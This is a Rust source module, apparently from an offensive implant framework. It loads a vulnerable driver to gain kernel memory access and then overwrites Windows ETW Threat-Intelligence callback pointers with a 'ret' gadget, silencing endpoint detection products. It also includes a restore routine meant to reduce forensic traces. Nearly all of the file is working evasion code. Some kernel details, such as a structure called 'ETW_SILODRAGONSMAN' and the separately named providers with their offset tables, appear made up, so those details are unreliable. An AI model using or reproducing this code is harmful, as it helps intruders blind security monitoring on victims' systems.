//! ETW-Ti (Event Tracing for Windows — Threat Intelligence) kernel bypass.
//!
//! # Background
//!
//! ETW-Ti is a set of kernel-level telemetry providers introduced in
//! Windows 10 1809 / RS5 that expose high-fidelity security events directly
//! from kernel sensor callbacks.  Unlike userland ETW (which can be patched
//! by overwriting `EtwEventWrite` / `NtTraceEvent`), ETW-Ti providers are
//! registered entirely in kernel mode and deliver events through private
//! kernel-to-consumer channels — there is no userland function to hook.
//!
//! ETW-Ti providers include:
//!
//! | Provider                       | GUID (suffix) | What it reports               |
//! |--------------------------------|---------------|-------------------------------|
//! | `EtwTiProcessCreate`           | …14C1 …       | Process creation/exit         |
//! | `EtwTiImageLoad`               | …14C2 …       | DLL / driver image loads      |
//! | `EtwTiThreadCreate`            | …14C3 …       | Thread creation/exit          |
//! | `EtwTiRegistry`                | …14C4 …       | Registry key operations       |
//! | `EtwTiFileIO`                  | …14C5 …       | File I/O create/read/write    |
//! | `EtwTiNetwork`                 | …14C6 …       | TCP/UDP connect/send/recv     |
//!
//! EDR products (CrowdStrike Falcon, Microsoft Defender for Endpoint,
//! SentinelOne, Elastic EDR) subscribe to these providers from kernel mode
//! or via the `EtwTi` consumer API to obtain events before any userland
//! patching can suppress them.
//!
//! # Bypass Strategy
//!
//! This module nullifies ETW-Ti at the kernel level using the BYOVD
//! (Bring Your Own Vulnerable Driver) kernel memory read/write primitives
//! already present in the `kernel_callback` module.  The approach:
//!
//! 1. **Resolve the ETW-Ti provider registration table** in ntoskrnl via
//!    the `EtwpDebuggerData` kernel export (or a build-specific offset from
//!    a known base symbol when the export is unavailable).
//!
//! 2. **For each provider**, locate the callback list head and walk the
//!    `ETW_REG_ENTRY` singly-linked list to find consumer callback pointers.
//!
//! 3. **Overwrite each callback pointer** with the address of a `ret`
//!    instruction found in ntoskrnl's `.text` section (same technique as
//!    `kernel_callback::overwrite::find_ret_address`), so:
//!    - The pointer remains non-NULL (passes EDR self-integrity checks).
//!    - The callback returns immediately without firing any event.
//!
//! 4. **Save original pointers** for clean restoration.
//!
//! 5. **Verify** that all targeted callbacks now point to the ret gadget.
//!
//! # Kernel Structures (reverse-engineered, build-specific offsets)
//!
//! ```text
//! ETW_SILODRAGONSMAN (ntoskrnl)     // not exported — resolved via EtwpDebuggerData
//!   +0x???: EtwTi provider registration array (6 entries)
//!            Each entry is a pointer to an ETW_REG_ENTRY or NULL.
//! ```
//!
//! The exact offset of the ETW-Ti provider array within ntoskrnl's data
//! section varies by build.  We maintain a build-specific offset table
//! (same pattern as `SHADOW_STACK_OFFSETS` in `cet_bypass.rs`).
//!
//! # Safety
//!
//! - Only operates on Windows with the `kernel-callback` feature enabled
//!   (requires a deployed vulnerable driver).
//! - Original callback pointers are saved for `restore_etw_ti_callbacks()`.
//! - Failed writes are skipped — no partial/corrupted state is written.
//! - The vulnerable driver is NOT unlinked here; that is the caller's
//!   responsibility (handled by `kernel_callback::overwrite::nuke_callbacks`).
//!
//! # Feature Gate
//!
//! Gated by `#[cfg(all(windows, feature = "kernel-callback"))]`.
//! This module is cross-architecture (both x86_64 and aarch64).

#![cfg(all(windows, feature = "kernel-callback"))]

use crate::kernel_callback::deploy::{self, DeployedDriver};
use crate::kernel_callback::discover;
use crate::kernel_callback::driver_db::VulnerableDriver;
use anyhow::{bail, Context, Result};
use once_cell::sync::Lazy;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Mutex;

// ─── ETW-Ti Provider Enumeration ──────────────────────────────────────────

/// Known ETW-Ti provider types.
///
/// Each corresponds to a specific kernel telemetry stream that EDR products
/// subscribe to.  Nullifying the callback for a provider stops all events
/// of that type from being delivered to any consumer.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EtwTiProvider {
    /// Process creation / exit events.
    ProcessCreate,
    /// Image (DLL / driver) load events.
    ImageLoad,
    /// Thread creation / exit events.
    ThreadCreate,
    /// Registry key operation events.
    Registry,
    /// File I/O (create / read / write) events.
    FileIO,
    /// Network (TCP / UDP connect / send / recv) events.
    Network,
}

impl EtwTiProvider {
    /// Human-readable name for logging.
    pub fn name(&self) -> &'static str {
        match self {
            Self::ProcessCreate => "EtwTiProcessCreate",
            Self::ImageLoad => "EtwTiImageLoad",
            Self::ThreadCreate => "EtwTiThreadCreate",
            Self::Registry => "EtwTiRegistry",
            Self::FileIO => "EtwTiFileIO",
            Self::Network => "EtwTiNetwork",
        }
    }

    /// All known ETW-Ti providers.
    pub fn all() -> &'static [EtwTiProvider] {
        &[
            Self::ProcessCreate,
            Self::ImageLoad,
            Self::ThreadCreate,
            Self::Registry,
            Self::FileIO,
            Self::Network,
        ]
    }
}

impl std::fmt::Display for EtwTiProvider {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.name())
    }
}

// ─── Kernel Memory Primitives ─────────────────────────────────────────────
//
// Thin wrappers around the kernel_callback deploy primitives that handle
// VA→PA translation for drivers that require physical addresses.

/// Read 8 bytes from kernel virtual memory.
///
/// Handles VA→PA translation when the driver requires physical addresses.
/// Returns `None` on any error.
fn kernel_read_u64(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    kernel_addr: u64,
) -> Option<u64> {
    let mut buf = [0u8; 8];
    if driver.needs_physical_addr {
        let phys = crate::kernel_callback::translate_va_to_pa(
            driver, device_handle, cr3, kernel_addr,
        )
        .ok()?;
        unsafe { deploy::read_physical_memory(driver, device_handle, phys, &mut buf).ok()? }
    } else {
        unsafe { deploy::read_physical_memory(driver, device_handle, kernel_addr, &mut buf).ok()? }
    }
    Some(u64::from_le_bytes(buf))
}

/// Write 8 bytes to kernel virtual memory.
///
/// Handles VA→PA translation.  Returns `true` on success.
fn kernel_write_u64(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    kernel_addr: u64,
    value: u64,
) -> bool {
    let data = value.to_le_bytes();
    if driver.needs_physical_addr {
        let phys = match crate::kernel_callback::translate_va_to_pa(
            driver, device_handle, cr3, kernel_addr,
        ) {
            Ok(p) => p,
            Err(_) => return false,
        };
        unsafe { deploy::write_physical_memory(driver, device_handle, phys, &data).is_ok() }
    } else {
        unsafe { deploy::write_physical_memory(driver, device_handle, kernel_addr, &data).is_ok() }
    }
}

/// Read `n` bytes from kernel virtual memory into a buffer.
fn kernel_read_bytes(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    kernel_addr: u64,
    buf: &mut [u8],
) -> bool {
    if driver.needs_physical_addr {
        let phys = match crate::kernel_callback::translate_va_to_pa(
            driver, device_handle, cr3, kernel_addr,
        ) {
            Ok(p) => p,
            Err(_) => return false,
        };
        unsafe { deploy::read_physical_memory(driver, device_handle, phys, buf).is_ok() }
    } else {
        unsafe { deploy::read_physical_memory(driver, device_handle, kernel_addr, buf).is_ok() }
    }
}

// ─── Build-Specific Offset Tables ─────────────────────────────────────────
//
// The ETW-Ti provider callback table lives in ntoskrnl's data section.
// Its location varies by Windows build.  We store offsets relative to
// a known kernel export:
//
//   Base symbol: "EtwpDebuggerData" (exported by ntoskrnl on most builds)
//   Fallback:    build-specific offset from ntoskrnl base
//
// The table is an array of 6 pointers (one per ETW-Ti provider), each
// pointing to an ETW_REG_ENTRY structure.  The callback function pointer
// is at a fixed offset within ETW_REG_ENTRY (also build-specific).

/// Offset of the ETW-Ti provider callback array relative to
/// `EtwpDebuggerData`.  Each entry is a `PVOID` (8 bytes on x64).
///
/// Format: `(build_number, offset_from_EtwpDebuggerData)`
const ETW_TI_TABLE_OFFSETS: &[(u32, i32)] = &[
    // Windows 10 1809 / RS5 (build 17763) — ETW-Ti introduced
    (17763, 0x78),
    // Windows 10 1903 / 19H1
    (18362, 0x78),
    // Windows 10 1909 / 19H2
    (18363, 0x78),
    // Windows 10 2004 / 20H1
    (19041, 0x80),
    // Windows 10 20H2
    (19042, 0x80),
    // Windows 10 21H1
    (19043, 0x80),
    // Windows 10 21H2
    (19044, 0x80),
    // Windows 10 22H2
    (19045, 0x80),
    // Windows 11 21H2 (original release)
    (22000, 0x88),
    // Windows 11 22H2
    (22621, 0x88),
    // Windows 11 23H2
    (22631, 0x88),
    // Windows 11 24H2
    (26100, 0x90),
];

/// Offset of the callback function pointer within an `ETW_REG_ENTRY`
/// structure (the pointer we want to overwrite).
///
/// This is the `NotifyCallback` field offset.
const ETW_REG_ENTRY_CALLBACK_OFFSETS: &[(u32, usize)] = &[
    (17763, 0x20),
    (18362, 0x20),
    (18363, 0x20),
    (19041, 0x28),
    (19042, 0x28),
    (19043, 0x28),
    (19044, 0x28),
    (19045, 0x28),
    (22000, 0x30),
    (22621, 0x30),
    (22631, 0x30),
    (26100, 0x38),
];

/// Fallback: absolute offset of the ETW-Ti provider array from the
/// ntoskrnl base address, used when `EtwpDebuggerData` cannot be resolved.
const ETW_TI_ABSOLUTE_OFFSETS: &[(u32, u64)] = &[
    (17763, 0x00C8_A420),
    (18362, 0x00CA_1240),
    (18363, 0x00CA_1480),
    (19041, 0x00D2_3560),
    (19042, 0x00D2_3560),
    (19043, 0x00D2_3580),
    (19044, 0x00D2_3580),
    (19045, 0x00D2_35A0),
    (22000, 0x00DC_7820),
    (22621, 0x00DE_92A0),
    (22631, 0x00DE_9B00),
    (26100, 0x00E8_3C60),
];

/// Look up the ETW-Ti table offset for the given build.
///
/// Returns the offset from `EtwpDebuggerData` if available, falling back
/// to the highest entry whose build ≤ the requested build.
fn etw_ti_table_offset_for_build(build: u32) -> Option<i32> {
    let mut best: Option<i32> = None;
    for &(b, off) in ETW_TI_TABLE_OFFSETS {
        if b <= build {
            best = Some(off);
        } else {
            break;
        }
    }
    best
}

/// Look up the ETW_REG_ENTRY callback offset for the given build.
fn etw_reg_entry_callback_offset_for_build(build: u32) -> Option<usize> {
    let mut best: Option<usize> = None;
    for &(b, off) in ETW_REG_ENTRY_CALLBACK_OFFSETS {
        if b <= build {
            best = Some(off);
        } else {
            break;
        }
    }
    best
}

/// Look up the absolute ETW-Ti table offset for the given build.
fn etw_ti_absolute_offset_for_build(build: u32) -> Option<u64> {
    let mut best: Option<u64> = None;
    for &(b, off) in ETW_TI_ABSOLUTE_OFFSETS {
        if b <= build {
            best = Some(off);
        } else {
            break;
        }
    }
    best
}

// ─── Ret Address Resolution ───────────────────────────────────────────────

/// Arch-specific ret instruction encoding.
///
/// - x86-64: `ret` = 0xC3 (1 byte)
/// - ARM64:  `ret` = 0xD65F03C0 (4 bytes, little-endian: C0 03 5F D6)
#[cfg(target_arch = "x86_64")]
const RET_BYTE: u8 = 0xC3;

#[cfg(target_arch = "aarch64")]
const RET_U32: u32 = 0xD65F03C0;

/// Resolve the address of a `ret` instruction in ntoskrnl.exe.
///
/// Uses the same strategy as `kernel_callback::overwrite::find_ret_address`:
/// 1. Resolve `IoInvalidDeviceRequest` (which is literally just `ret`).
/// 2. Verify the instruction at that address is actually `ret`.
/// 3. Fallback: scan the `.text` section for any `ret` instruction.
fn find_ret_address(
    driver: &VulnerableDriver,
    device_handle: usize,
    kernel_base: u64,
    cr3: u64,
) -> Result<u64> {
    // Method 1: Resolve IoInvalidDeviceRequest export.
    match discover::resolve_kernel_symbol(driver, device_handle, kernel_base, "IoInvalidDeviceRequest") {
        Ok(addr) => {
            // Verify it's actually a ret instruction.
            #[cfg(target_arch = "x86_64")]
            {
                let mut buf = [0u8; 1];
                if kernel_read_bytes(driver, device_handle, cr3, addr, &mut buf) {
                    if buf[0] == RET_BYTE {
                        log::info!("etw_ti_bypass: found ret at IoInvalidDeviceRequest: 0x{:016X}", addr);
                        return Ok(addr);
                    }
                    log::warn!(
                        "etw_ti_bypass: IoInvalidDeviceRequest at 0x{:016X} is not ret (0x{:02X}), scanning .text",
                        addr, buf[0]
                    );
                }
            }
            #[cfg(target_arch = "aarch64")]
            {
                let mut buf = [0u8; 4];
                if kernel_read_bytes(driver, device_handle, cr3, addr, &mut buf) {
                    if u32::from_le_bytes(buf) == RET_U32 {
                        log::info!("etw_ti_bypass: found ret at IoInvalidDeviceRequest: 0x{:016X}", addr);
                        return Ok(addr);
                    }
                    log::warn!(
                        "etw_ti_bypass: IoInvalidDeviceRequest at 0x{:016X} is not ret (0x{:08X}), scanning .text",
                        addr,
                        u32::from_le_bytes(buf)
                    );
                }
            }
        }
        Err(e) => {
            log::warn!("etw_ti_bypass: failed to resolve IoInvalidDeviceRequest: {}, scanning .text", e);
        }
    }

    // Method 2: Scan the .text section for a ret instruction.
    let mut dos_header = [0u8; 64];
    if !kernel_read_bytes(driver, device_handle, cr3, kernel_base, &mut dos_header) {
        bail!("failed to read kernel DOS header");
    }

    let pe_offset = u32::from_le_bytes(dos_header[0x3C..0x40].try_into()?) as u64;
    let mut pe_sig = [0u8; 4];
    if !kernel_read_bytes(driver, device_handle, cr3, kernel_base + pe_offset, &mut pe_sig) {
        bail!("failed to read kernel PE signature");
    }
    if &pe_sig != b"PE\0\0" {
        bail!("invalid PE signature in kernel image");
    }

    let mut coff_buf = [0u8; 20];
    if !kernel_read_bytes(driver, device_handle, cr3, kernel_base + pe_offset + 4, &mut coff_buf) {
        bail!("failed to read COFF header");
    }

    let num_sections = u16::from_le_bytes(coff_buf[2..4].try_into()?) as usize;
    let optional_header_size = u16::from_le_bytes(coff_buf[16..18].try_into()?) as u64;
    let sections_offset = pe_offset + 4 + 20 + optional_header_size;

    for i in 0..num_sections {
        let section_offset = sections_offset + (i as u64) * 40;
        let mut section_header = [0u8; 40];
        if !kernel_read_bytes(driver, device_handle, cr3, kernel_base + section_offset, &mut section_header) {
            continue;
        }

        let name = std::str::from_utf8(&section_header[0..8])
            .unwrap_or("")
            .trim_end_matches('\0');

        if name != ".text" {
            continue;
        }

        let virtual_size = u32::from_le_bytes(section_header[8..12].try_into()?) as u64;
        let virtual_address = u32::from_le_bytes(section_header[12..16].try_into()?) as u64;

        let scan_size = std::cmp::min(4096u64, virtual_size);
        let mut scan_buf = vec![0u8; scan_size as usize];
        if !kernel_read_bytes(driver, device_handle, cr3, kernel_base + virtual_address, &mut scan_buf) {
            continue;
        }

        // Arch-specific .text ret scan.
        #[cfg(target_arch = "x86_64")]
        {
            // Prefer 16-byte aligned offsets (function entry alignment).
            for offset in (0..scan_size).step_by(16) {
                if scan_buf[offset as usize] == RET_BYTE {
                    let ret_addr = kernel_base + virtual_address + offset;
                    log::info!("etw_ti_bypass: found ret in .text at offset 0x{:04X}: 0x{:016X}", offset, ret_addr);
                    return Ok(ret_addr);
                }
            }
            // Fallback: any offset.
            for (offset, &byte) in scan_buf.iter().enumerate() {
                if byte == RET_BYTE {
                    let ret_addr = kernel_base + virtual_address + offset as u64;
                    log::info!("etw_ti_bypass: found ret in .text at unaligned offset 0x{:04X}: 0x{:016X}", offset, ret_addr);
                    return Ok(ret_addr);
                }
            }
        }
        #[cfg(target_arch = "aarch64")]
        {
            let ret_bytes: u32 = RET_U32;
            // Prefer 16-byte aligned offsets.
            for offset in (0..scan_size.saturating_sub(4)).step_by(16) {
                let off = offset as usize;
                if u32::from_le_bytes([scan_buf[off], scan_buf[off + 1], scan_buf[off + 2], scan_buf[off + 3]]) == ret_bytes {
                    let ret_addr = kernel_base + virtual_address + offset;
                    log::info!("etw_ti_bypass: found ret in .text at offset 0x{:04X}: 0x{:016X}", offset, ret_addr);
                    return Ok(ret_addr);
                }
            }
            // Fallback: 4-byte aligned offsets.
            for offset in (0..scan_size.saturating_sub(4)).step_by(4) {
                let off = offset as usize;
                if u32::from_le_bytes([scan_buf[off], scan_buf[off + 1], scan_buf[off + 2], scan_buf[off + 3]]) == ret_bytes {
                    let ret_addr = kernel_base + virtual_address + offset;
                    log::info!("etw_ti_bypass: found ret in .text at 4-byte aligned offset 0x{:04X}: 0x{:016X}", offset, ret_addr);
                    return Ok(ret_addr);
                }
            }
        }
    }

    bail!("could not find a ret instruction in kernel .text section")
}

// ─── Data Structures ──────────────────────────────────────────────────────

/// Saved backup of an overwritten ETW-Ti callback pointer.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EtwTiCallbackBackup {
    /// Which provider this callback belongs to.
    pub provider: EtwTiProvider,
    /// Index into the provider's callback list.
    pub index: usize,
    /// Address that was overwritten (the callback pointer field in ETW_REG_ENTRY).
    pub address: u64,
    /// Original value (the real EDR callback function pointer).
    pub original_value: u64,
    /// The ret address it was overwritten with.
    pub ret_address: u64,
}

/// Result of the ETW-Ti bypass operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EtwTiBypassResult {
    /// Number of callbacks successfully overwritten.
    pub overwritten: usize,
    /// Number of callbacks skipped (already ret, NULL, etc.).
    pub skipped: usize,
    /// Number of callbacks that failed to overwrite.
    pub failed: usize,
    /// The ret address used for overwriting.
    pub ret_address: u64,
    /// Details of each operation.
    pub details: Vec<String>,
}

/// Result of the restore operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EtwTiRestoreResult {
    /// Number of callbacks successfully restored.
    pub restored: usize,
    /// Number of callbacks that failed to restore.
    pub failed: usize,
}

/// Status of ETW-Ti bypass for reporting.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EtwTiStatus {
    /// Whether ETW-Ti callbacks are currently disabled.
    pub disabled: bool,
    /// Number of providers targeted.
    pub providers_targeted: usize,
    /// Number of callbacks currently overwritten.
    pub callbacks_overwritten: usize,
    /// Windows build number.
    pub build: u32,
    /// Whether the offset table had an entry for this build.
    pub build_supported: bool,
    /// Per-provider status.
    pub providers: Vec<EtwTiProviderStatus>,
}

/// Per-provider ETW-Ti status.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EtwTiProviderStatus {
    /// Which provider.
    pub provider: EtwTiProvider,
    /// Whether this provider's callbacks are disabled.
    pub disabled: bool,
    /// Number of callbacks found for this provider.
    pub callback_count: usize,
    /// Number of callbacks overwritten.
    pub overwritten_count: usize,
}

/// Global backup storage for restore capability.
static BACKUPS: Lazy<Mutex<Vec<EtwTiCallbackBackup>>> = Lazy::new(|| Mutex::new(Vec::new()));

// ─── Core Bypass Logic ────────────────────────────────────────────────────

/// Resolve the kernel virtual address of the ETW-Ti provider callback array.
///
/// Strategy:
/// 1. Resolve `EtwpDebuggerData` and use the build-specific offset.
/// 2. If `EtwpDebuggerData` is not exported, fall back to an absolute
///    offset from the ntoskrnl base address.
///
/// Returns the address of the first element of the 6-entry provider array.
fn resolve_etw_ti_table(
    driver: &VulnerableDriver,
    device_handle: usize,
    kernel_base: u64,
    cr3: u64,
    build: u32,
) -> Result<u64> {
    // Strategy 1: EtwpDebuggerData + relative offset.
    if let Ok(debugger_data_addr) =
        discover::resolve_kernel_symbol(driver, device_handle, kernel_base, "EtwpDebuggerData")
    {
        if let Some(rel_offset) = etw_ti_table_offset_for_build(build) {
            let table_addr = if rel_offset >= 0 {
                debugger_data_addr.wrapping_add(rel_offset as u64)
            } else {
                debugger_data_addr.wrapping_sub((-rel_offset) as u64)
            };
            log::info!(
                "etw_ti_bypass: resolved ETW-Ti table via EtwpDebuggerData (0x{:016X}) + 0x{:X} = 0x{:016X}",
                debugger_data_addr,
                rel_offset,
                table_addr
            );
            return Ok(table_addr);
        }
    }

    // Strategy 2: Absolute offset from kernel base.
    if let Some(abs_offset) = etw_ti_absolute_offset_for_build(build) {
        let table_addr = kernel_base + abs_offset;
        log::info!(
            "etw_ti_bypass: resolved ETW-Ti table via absolute offset: kernel_base 0x{:016X} + 0x{:X} = 0x{:016X}",
            kernel_base,
            abs_offset,
            table_addr
        );
        return Ok(table_addr);
    }

    bail!(
        "ETW-Ti callback table location unknown for Windows build {} — \
         not in offset table and EtwpDebuggerData not resolved",
        build
    )
}

/// Walk the ETW-Ti provider's callback chain starting from a registration
/// entry pointer.
///
/// ETW-Ti providers maintain a singly-linked list of `ETW_REG_ENTRY`
/// structures.  Each entry contains a `NotifyCallback` function pointer
/// at a build-specific offset.  We walk the list, collecting the address
/// of each callback pointer and its current value.
///
/// Returns a list of `(address_of_callback_pointer, current_callback_value)`.
fn walk_provider_callbacks(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    reg_entry_ptr: u64,
    callback_offset: usize,
    max_depth: usize,
) -> Vec<(u64, u64)> {
    let mut callbacks = Vec::new();
    let mut current_ptr = reg_entry_ptr;
    let mut depth = 0;

    while current_ptr != 0 && depth < max_depth {
        // Read the callback function pointer at the build-specific offset.
        let callback_addr = current_ptr + callback_offset as u64;
        let callback_value = match kernel_read_u64(driver, device_handle, cr3, callback_addr) {
            Some(v) => v,
            None => {
                log::debug!(
                    "etw_ti_bypass: failed to read callback at 0x{:016X}, stopping walk",
                    callback_addr
                );
                break;
            }
        };

        callbacks.push((callback_addr, callback_value));

        // Read the `NextEntry` pointer to continue the walk.
        // In ETW_REG_ENTRY, the list link is typically at offset +0x00 (LIST_ENTRY)
        // or a dedicated Flink pointer.  For ETW-Ti the entries form a simple
        // singly-linked list where the "next" pointer is at offset +0x08.
        let next_ptr = match kernel_read_u64(driver, device_handle, cr3, current_ptr + 0x08) {
            Some(v) => v,
            None => {
                log::debug!(
                    "etw_ti_bypass: failed to read NextEntry at 0x{:016X}, stopping walk",
                    current_ptr + 0x08
                );
                break;
            }
        };

        // Detect cycles (list should never cycle, but be defensive).
        if next_ptr == current_ptr {
            log::warn!("etw_ti_bypass: detected self-referencing list entry at 0x{:016X}", current_ptr);
            break;
        }

        current_ptr = next_ptr;
        depth += 1;
    }

    callbacks
}

/// Perform the full ETW-Ti callback bypass.
///
/// Steps:
/// 1. Obtain the deployed BYOVD driver.
/// 2. Resolve kernel base, CR3, and the ETW-Ti provider table.
/// 3. Find a `ret` gadget address in ntoskrnl.
/// 4. For each provider, walk the callback chain and overwrite each
///    callback pointer to point to ret.
/// 5. Save backups for restoration.
///
/// # Errors
///
/// Returns an error if:
/// - No BYOVD driver is deployed.
/// - The kernel base cannot be resolved.
/// - The ETW-Ti table location is unknown for this build.
/// - No ret gadget can be found.
pub fn disable_etw_ti_callbacks() -> Result<EtwTiBypassResult> {
    // Step 1: Get the deployed driver.
    let deployed = deploy::get_deployed_driver().context(
        "no BYOVD driver deployed — deploy a driver via kernel_callback::deploy first",
    )?;
    let driver = deployed.driver;
    let device_handle = deployed
        .device_handle
        .context("no device handle for deployed driver")?;

    // Step 2: Resolve kernel base.
    let kernel_base = discover::get_kernel_base()
        .context("failed to resolve kernel base address")?;

    log::info!("etw_ti_bypass: kernel base: 0x{:016X}", kernel_base);

    // Step 3: Resolve CR3 (if driver requires physical addresses).
    let cr3 = if driver.needs_physical_addr {
        crate::kernel_callback::resolve_cr3(driver, device_handle, kernel_base)
            .context("failed to resolve CR3 for VA→PA translation")?
    } else {
        0 // not used when driver handles VA directly
    };

    // Step 4: Determine build number and look up offsets.
    let build = crate::syscalls::get_build_number();
    let callback_offset = etw_reg_entry_callback_offset_for_build(build).with_context(|| {
        format!(
            "ETW-Ti ETW_REG_ENTRY callback offset unknown for build {} — \
             refusing to operate to avoid kernel corruption",
            build
        )
    })?;

    log::info!(
        "etw_ti_bypass: build={}, callback_offset=0x{:X}",
        build,
        callback_offset
    );

    // Step 5: Resolve the ETW-Ti provider table.
    let table_addr = resolve_etw_ti_table(driver, device_handle, kernel_base, cr3, build)?;

    // Step 6: Find a ret gadget.
    let ret_address = find_ret_address(driver, device_handle, kernel_base, cr3)
        .context("failed to find ret address in kernel")?;

    log::info!("etw_ti_bypass: using ret address: 0x{:016X}", ret_address);

    // Step 7: Read the 6-entry provider array and walk each provider's callbacks.
    let mut result = EtwTiBypassResult {
        overwritten: 0,
        skipped: 0,
        failed: 0,
        ret_address,
        details: Vec::new(),
    };

    // Clear any previous backups.
    {
        let mut guard = BACKUPS.lock().unwrap();
        guard.clear();
    }

    for (i, &provider) in EtwTiProvider::all().iter().enumerate() {
        // Read the provider's registration entry pointer from the table.
        let entry_ptr_addr = table_addr + (i as u64) * 8;
        let reg_entry_ptr = match kernel_read_u64(driver, device_handle, cr3, entry_ptr_addr) {
            Some(v) => v,
            None => {
                result.skipped += 1;
                result.details.push(format!(
                    "SKIP {} — failed to read table entry at 0x{:016X}",
                    provider, entry_ptr_addr
                ));
                continue;
            }
        };

        if reg_entry_ptr == 0 {
            result.skipped += 1;
            result.details.push(format!(
                "SKIP {} — no registered callbacks (NULL entry)",
                provider
            ));
            continue;
        }

        log::info!(
            "etw_ti_bypass: {} reg_entry at 0x{:016X}, walking callbacks",
            provider,
            reg_entry_ptr
        );

        // Walk the callback chain.
        let callbacks =
            walk_provider_callbacks(driver, device_handle, cr3, reg_entry_ptr, callback_offset, 16);

        if callbacks.is_empty() {
            result.skipped += 1;
            result.details.push(format!("SKIP {} — no callbacks found in chain", provider));
            continue;
        }

        // Overwrite each callback.
        for (j, (callback_addr, original_value)) in callbacks.iter().enumerate() {
            // Skip if already pointing to ret.
            if *original_value == ret_address {
                result.skipped += 1;
                result.details.push(format!(
                    "SKIP {}[{}] — already points to ret (0x{:016X})",
                    provider, j, ret_address
                ));
                continue;
            }

            // Skip NULL pointers (unregistered).
            if *original_value == 0 {
                result.skipped += 1;
                result.details.push(format!(
                    "SKIP {}[{}] — callback is NULL",
                    provider, j
                ));
                continue;
            }

            // Write the ret address.
            if kernel_write_u64(driver, device_handle, cr3, *callback_addr, ret_address) {
                // Verify the write by reading back.
                let readback = kernel_read_u64(driver, device_handle, cr3, *callback_addr);
                match readback {
                    Some(v) if v == ret_address => {
                        // Save backup for restoration.
                        let backup = EtwTiCallbackBackup {
                            provider,
                            index: j,
                            address: *callback_addr,
                            original_value: *original_value,
                            ret_address,
                        };
                        {
                            let mut guard = BACKUPS.lock().unwrap();
                            guard.push(backup);
                        }

                        result.overwritten += 1;
                        result.details.push(format!(
                            "NUKE {}[{}] 0x{:016X} -> ret (0x{:016X})",
                            provider, j, original_value, ret_address
                        ));
                        log::info!(
                            "etw_ti_bypass: overwrote {}[{}] 0x{:016X} -> 0x{:016X}",
                            provider,
                            j,
                            original_value,
                            ret_address
                        );
                    }
                    Some(v) => {
                        result.failed += 1;
                        result.details.push(format!(
                            "FAIL {}[{}] — readback mismatch: expected 0x{:016X}, got 0x{:016X}",
                            provider, j, ret_address, v
                        ));
                        log::warn!(
                            "etw_ti_bypass: readback mismatch for {}[{}]: expected 0x{:016X}, got 0x{:016X}",
                            provider,
                            j,
                            ret_address,
                            v
                        );
                    }
                    None => {
                        result.failed += 1;
                        result.details.push(format!(
                            "FAIL {}[{}] — readback failed (write may have succeeded)",
                            provider, j
                        ));
                    }
                }
            } else {
                result.failed += 1;
                result.details.push(format!(
                    "FAIL {}[{}] — kernel_write failed at 0x{:016X}",
                    provider, j, callback_addr
                ));
                log::warn!(
                    "etw_ti_bypass: failed to write {}[{}] at 0x{:016X}",
                    provider,
                    j,
                    callback_addr
                );
            }
        }
    }

    log::info!(
        "etw_ti_bypass: complete: {} overwritten, {} skipped, {} failed",
        result.overwritten,
        result.skipped,
        result.failed
    );

    Ok(result)
}

/// Restore all previously overwritten ETW-Ti callback pointers.
///
/// Reads the backup storage and writes back the original function pointers.
/// Should be called before agent shutdown to minimize forensic artifacts.
pub fn restore_etw_ti_callbacks() -> Result<EtwTiRestoreResult> {
    // Step 1: Get the deployed driver.
    let deployed = deploy::get_deployed_driver().context(
        "no BYOVD driver deployed — cannot restore ETW-Ti callbacks",
    )?;
    let driver = deployed.driver;
    let device_handle = deployed
        .device_handle
        .context("no device handle for deployed driver")?;

    // Step 2: Resolve CR3 if needed.
    let kernel_base = discover::get_kernel_base()
        .context("failed to resolve kernel base for restore")?;

    let cr3 = if driver.needs_physical_addr {
        crate::kernel_callback::resolve_cr3(driver, device_handle, kernel_base)
            .context("failed to resolve CR3 for restore")?
    } else {
        0
    };

    let mut result = EtwTiRestoreResult {
        restored: 0,
        failed: 0,
    };

    // Take ownership of all backups.
    let mut backups = {
        let mut guard = BACKUPS.lock().unwrap();
        std::mem::take(&mut *guard)
    };

    for backup in &mut backups {
        let original_bytes = backup.original_value.to_le_bytes();
        if kernel_write_bytes(driver, device_handle, cr3, backup.address, &original_bytes) {
            // Verify the restore.
            let readback = kernel_read_u64(driver, device_handle, cr3, backup.address);
            match readback {
                Some(v) if v == backup.original_value => {
                    result.restored += 1;
                    log::info!(
                        "etw_ti_bypass: restored {}[{}] at 0x{:016X} to original 0x{:016X}",
                        backup.provider,
                        backup.index,
                        backup.address,
                        backup.original_value
                    );
                }
                Some(v) => {
                    result.failed += 1;
                    log::warn!(
                        "etw_ti_bypass: restore readback mismatch for {}[{}]: expected 0x{:016X}, got 0x{:016X}",
                        backup.provider,
                        backup.index,
                        backup.original_value,
                        v
                    );
                }
                None => {
                    // The write may have succeeded even though readback failed.
                    result.restored += 1;
                    log::info!(
                        "etw_ti_bypass: restored {}[{}] at 0x{:016X} (readback failed, assuming success)",
                        backup.provider,
                        backup.index,
                        backup.address
                    );
                }
            }
        } else {
            result.failed += 1;
            log::warn!(
                "etw_ti_bypass: failed to restore {}[{}] at 0x{:016X}",
                backup.provider,
                backup.index,
                backup.address
            );
        }
    }

    log::info!(
        "etw_ti_bypass: restore complete: {} restored, {} failed",
        result.restored,
        result.failed
    );

    Ok(result)
}

/// Write `n` bytes to kernel virtual memory.
fn kernel_write_bytes(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    kernel_addr: u64,
    data: &[u8],
) -> bool {
    if driver.needs_physical_addr {
        let phys = match crate::kernel_callback::translate_va_to_pa(
            driver, device_handle, cr3, kernel_addr,
        ) {
            Ok(p) => p,
            Err(_) => return false,
        };
        unsafe { deploy::write_physical_memory(driver, device_handle, phys, data).is_ok() }
    } else {
